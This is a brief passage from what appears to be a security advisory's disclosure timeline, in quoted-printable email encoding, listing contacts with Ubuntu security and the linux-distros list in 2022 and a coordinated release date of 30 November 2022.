=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Timeline
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

2022-08-23: Contacted security@ubuntu.

2022-11-28: Contacted linux-distros@openwall.

2022-11-30: Coordinated Release Date (17:00 UTC).
